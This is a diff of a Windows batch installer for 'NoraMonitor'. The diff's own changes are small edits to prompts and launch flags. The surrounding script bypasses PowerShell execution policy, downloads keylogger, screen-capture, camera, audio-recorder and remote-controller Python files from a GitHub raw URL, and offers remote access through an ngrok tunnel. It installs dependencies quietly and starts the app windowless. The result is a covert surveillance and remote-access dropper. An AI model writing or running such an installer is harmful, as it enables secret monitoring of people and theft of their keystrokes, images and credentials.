@@ -1,4 +1,6 @@
 @echo off
+setlocal enabledelayedexpansion
+
 set "DIR=%APPDATA%\NoraMonitor"
 set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/nora-monitor-tool/nora-monitor"
 set "TOKENFILE=%DIR%\ngrok.token"
@@ -12,16 +14,16 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
   "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""
 
-:: Ask for ngrok token once, save it for next time
+:: Ask for ngrok token once, save for future runs
 if not exist "%TOKENFILE%" (
     echo.
-    echo To access remotely from your phone, enter your ngrok token.
-    echo Get it free at: ngrok.com - sign up then copy your token.
-    echo Leave blank to skip remote access and use local only.
+    echo For remote phone access, enter your ngrok token.
+    echo Get one free at ngrok.com - sign up then copy your authtoken.
+    echo Press Enter to skip ^(local network only^).
     echo.
     set /p NGROK_TOKEN=Ngrok token:
     if not "!NGROK_TOKEN!"=="" (
-        echo !NGROK_TOKEN! > "%TOKENFILE%"
+        echo !NGROK_TOKEN!> "%TOKENFILE%"
     )
 )
 
@@ -37,5 +39,7 @@ if %errorlevel% neq 0 (
 :: Install dependencies quietly
 pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location
 
-:: Launch silently
-start "" pythonw "%DIR%\app.py"
+:: Launch from install dir so relative paths resolve correctly
+start "" /D "%DIR%" pythonw "%DIR%\app.py"
+
+endlocal
